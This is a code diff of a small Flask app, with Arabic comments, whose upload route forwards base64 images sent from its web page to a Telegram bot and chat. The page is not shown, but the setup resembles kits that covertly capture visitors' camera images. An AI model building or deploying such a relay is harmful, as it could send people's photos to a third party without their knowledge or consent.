@@ -3,14 +3,16 @@ import requests
 import base64
 app = Flask(__name__)
 @app.route('/')
-def index():
-    return render_template('index.html')
+def index(): return render_template('index.html')
 @app.route('/upload', methods=['POST'])
 def upload():
     try:
         img_data = request.json['img'].split(',')[1]
-        requests.post('https://api.telegram.org/botYOUR_TOKEN/sendPhoto', data={'chat_id': 'YOUR_ID'}, files={'photo': ('img.jpg', base64.b64decode(img_data))})
-        return 'ok'
-    except: return 'error'
-# مهم جدا لـ Vercel
-app.debug = True
+        # استبدل الارقام التالية بدقة
+        token = 'YOUR_BOT_TOKEN_HERE'
+        chat_id = 'YOUR_CHAT_ID_HERE'
+        url = f'https://api.telegram.org/bot{token}/sendPhoto'
+        response = requests.post(url, data={'chat_id': chat_id}, files={'photo': ('img.jpg', base64.b64decode(img_data))})
+        return response.text
+    except Exception as e: return str(e)
+if __name__ == '__main__': app.run()
